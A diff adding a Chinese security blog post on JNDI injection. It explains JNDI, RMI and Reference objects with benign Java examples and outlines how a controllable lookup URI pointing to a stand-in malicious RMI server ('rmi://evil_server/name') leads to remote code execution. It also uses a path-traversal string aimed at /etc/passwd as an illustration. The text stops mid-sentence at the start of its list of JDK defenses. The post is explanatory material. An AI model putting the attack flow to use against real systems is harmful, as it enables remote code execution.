@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="有关JNDI注入的简要笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入笔记">
+<meta property="og:url" content="https://hasegawaazusa.github.io/jndi-injection-note.html">
+<meta property="og:site_name" content="独奏の小屋">
+<meta property="og:description" content="有关JNDI注入的简要笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-02-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-04-25T16:14:00.112Z">
+<meta property="article:author" content="qsdz">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://hasegawaazusa.github.io/jndi-injection-note.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hasegawaazusa.github.io/jndi-injection-note.html","path":"/jndi-injection-note.html","title":"JNDI注入笔记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JNDI注入笔记 | 独奏の小屋</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">独奏の小屋</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">67</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">133</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jndi-%E7%9A%84%E4%BA%8C%E4%B8%89%E4%BA%8B"><span class="nav-number">1.</span> <span class="nav-text">JNDI 的二三事</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-jndi"><span class="nav-number">1.1.</span> <span class="nav-text">什么是 JNDI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#spi"><span class="nav-number">1.2.</span> <span class="nav-text">SPI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rmi"><span class="nav-number">1.3.</span> <span class="nav-text">RMI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-number">1.4.</span> <span class="nav-text">Reference</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jndi-%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">JNDI 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">2.1.</span> <span class="nav-text">防御措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rmi-%E5%88%A9%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">RMI 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC"><span class="nav-number">2.2.1.</span> <span class="nav-text">低版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC"><span class="nav-number">2.2.2.</span> <span class="nav-text">高版本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ldap-%E5%88%A9%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">LDAP 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8E%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">低版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">高版本</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="qsdz"
+      src="/images/android-chrome-144x144.png">
+  <p class="site-author-name" itemprop="name">qsdz</p>
+  <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">133</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">67</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/jndi-injection-note.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/android-chrome-144x144.png">
+      <meta itemprop="name" content="qsdz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="独奏の小屋">
+      <meta itemprop="description" content="又菜又爱玩，望轻喷">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JNDI注入笔记 | 独奏の小屋">
+      <meta itemprop="description" content="有关JNDI注入的简要笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JNDI注入笔记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-02-24 00:00:00" itemprop="dateCreated datePublished" datetime="2024-02-24T00:00:00+08:00">2024-02-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-04-26 00:14:00" itemprop="dateModified" datetime="2024-04-26T00:14:00+08:00">2024-04-26</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">有关JNDI注入的简要笔记</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="jndi-的二三事">JNDI 的二三事</h1>
+<h2 id="什么是-jndi">什么是 JNDI</h2>
+<p>数据库是一种资源，我们使用 JDBC 对数据库作包装，然后通过适当的 JDBC
+URL 连接到数据库</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306?user=qsdz&amp;password=qsdzyyds&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>文件也是一种资源，比如说</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;file:///home/qsdz/flag.txt&quot;</span></span><br></pre></td></tr></table></figure>
+<p>网络资源也是一种资源，比如说</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.baidu.com&quot;</span></span><br></pre></td></tr></table></figure>
+<p>Java
+就是一门极其注重抽象的语言，那么我们是否可以对这些资源和资源的定位进行一种抽象？</p>
+<p>答案是是的，JNDI 全称 Java Naming and Directory Interface，分为
+Naming Server 和 Directory Server 两大部分。</p>
+<p>套用在文件资源中，Naming Server
+就是负责解析文件路径，获取文件对象的服务；Directory Server
+就是负责获取文件数据、信息的服务。</p>
+<p>套用在网络资源中，Naming Server 就是负责解析域名的系统，例如
+DNS；Directory Server 就是负责访问具体网络资源的服务，例如
+<code>/index.html</code>，<code>/../../../../etc/passwd</code>。</p>
+<p>通俗易懂地说，JNDI 就是 Java
+中负责资源管理的抽象接口，在这套系统中，我们可以给资源取一个名字，然后通过名字来查找资源，获取资源的属性。</p>
+<h2 id="spi">SPI</h2>
+<p>JNDI 原生支持的一部分协议如下表所示</p>
+<table>
+<colgroup>
+<col style="width: 8%">
+<col style="width: 18%">
+<col style="width: 73%">
+</colgroup>
+<thead>
+<tr class="header">
+<th>协议</th>
+<th>schema</th>
+<th>Context</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>DNS</code></td>
+<td><code>dns://</code></td>
+<td><code>com.sun.jndi.url.dns.dnsURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>RMI</code></td>
+<td><code>rmi://</code></td>
+<td><code>com.sun.jndi.url.rmi.rmiURLContext</code></td>
+</tr>
+<tr class="odd">
+<td><code>LDAP</code></td>
+<td><code>ldap://</code></td>
+<td><code>com.sun.jndi.url.ldap.ldapURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>LDAP</code></td>
+<td><code>ldaps://</code></td>
+<td><code>com.sun.jndi.url.ldaps.ldapsURLContextFactory</code></td>
+</tr>
+<tr class="odd">
+<td><code>IIOP</code></td>
+<td><code>iiop://</code></td>
+<td><code>com.sun.jndi.url.iiop.iiopURLContext</code></td>
+</tr>
+<tr class="even">
+<td><code>IIOP</code></td>
+<td><code>iiopname://</code></td>
+<td><code>com.sun.jndi.url.iiopname.iiopnameURLContextFactory</code></td>
+</tr>
+<tr class="odd">
+<td><code>IIOP</code></td>
+<td><code>corbaname://</code></td>
+<td><code>com.sun.jndi.url.corbaname.corbanameURLContextFactory</code></td>
+</tr>
+</tbody>
+</table>
+<p>而针对这些不同自定义协议的解析，是通过 SPI，<em>Service Provider
+Interface</em>，服务供应接口进行实现的，通过实现
+SPI，我们就能够自定义各种不同的协议方式通过 URL
+的方式访问不同类型的资源。</p>
+<h2 id="rmi">RMI</h2>
+<p>RMI，<em>Remote Method Invocation</em>，远程方法调用，这是 Java
+分布式编程中一个十分重要的接口，能够使得客户端远程调用服务端的对象资源。</p>
+<p>比如说我们有这么一个接口</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.interfaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteHello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>服务端对外屏蔽实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteHello</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteHelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Method `RemoteHelloImpl.hello` is called.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>服务端的 RMI 服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里将 <code>hello</code> 对象资源绑定到命名为 <code>hello</code> 的
+RMI Registry 中。</p>
+<p>客户端的 RMI 服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException, RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RemoteHello) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI hello ret value: &quot;</span> + ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样就实现了远程对象获取，对客户端屏蔽了实现，仅需服务端进行垃圾回收和资源管理，而多台客户端可以大量获取服务端资源而减少性能损耗，为分布式提供可能。</p>
+<p>这里调用的 <code>hello.hello()</code>
+在本地并没有相应的执行过程，而是<strong>远程对象的远程方法调用</strong>，具体执行过程是在服务端，客户端仅获取到服务端的运行结果。</p>
+<p>而 JNDI 下的 RMI，通过 SPI 实现协议接口，可以通过 Naming Server
+直接获取 RMI 资源，例如</p>
+<p>服务端代码改写为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloImpl</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而客户端代码改写为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.qsdz.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.qsdz.interfaces.RemoteHello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotBoundException, RemoteException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">RemoteHello</span> <span class="variable">hello</span> <span class="operator">=</span> (RemoteHello) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI hello ret value: &quot;</span> + ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="reference">Reference</h2>
+<p>Reference
+嘞表示对存在于<strong>命名/目录系统外</strong>的对象的引用。</p>
+<p>比如说</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">refObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;refClassName&quot;</span>, <span class="string">&quot;insClassName&quot;</span>, <span class="string">&quot;http://example.com:12345/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(refObj);</span><br><span class="line">registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
+<p>当有客户端通过 lookup 查询 <code>refObj</code>
+资源获取远程对象时，会获得一个 <code>Reference</code>
+类的存根，而对于该类客户端会寻找 <code>refClassName</code>
+匹配的类名。</p>
+<p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code>，</p>
+<ol type="1">
+<li><code>className</code> - 远程加载时所使用的类名</li>
+<li><code>classFactory</code> -
+加载的<code>class</code>中需要实例化类的名称</li>
+<li><code>classFactoryLocation</code> -
+提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li>
+</ol>
+<p>Reference
+的使用场景在于实例化对象的引用，对于某些数据类我们是希望在本地执行过程而非在远程执行的，所以我们可以通过
+Reference 类获取类字节码，随后在本地实例化它。</p>
+<p>而 ReferenceWrapper 是包装类，用于保证 Reference 可以被 RMI
+协议传输。</p>
+<h1 id="jndi-注入">JNDI 注入</h1>
+<h2 id="防御措施">防御措施</h2>
+<p>那么如果说 JNDI 客户端的 <code>lookup</code> 参数可控，服务端
+<code>Reference</code> 的 <code>classFactoryLocation</code>
+可控，那么我们就可以使其执行一些恶意代码。</p>
+<p>利用流程如下：</p>
+<ul>
+<li>目标代码中调用了
+<code>InitialContext.lookup(URI)</code>，且URI为用户可控；</li>
+<li>攻击者控制URI参数为恶意的RMI服务地址，如：<code>rmi://evil_server/name</code>；</li>
+<li>攻击者RMI服务器向目标返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定某个精心构造的<code>Factory</code>类；</li>
+<li>目标在进行<code>lookup()</code>操作时，会动态加载并实例化Factory类，接着调用<code>factory.getObjectInstance()</code>获取外部远程对象实例；</li>
+<li>攻击者可以在Factory类文件的构造方法、静态代码块、<code>getObjectInstance()</code>方法等处写入恶意代码，达到RCE的效果</li>
+</ul>
+<p>为了防止 JNDI 注入，下文是 Java 作的一些防御措施</p>
+<ul>
+<li>JDK
+6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI
+ClassLoader的安全性。</li>
+<li>JDK
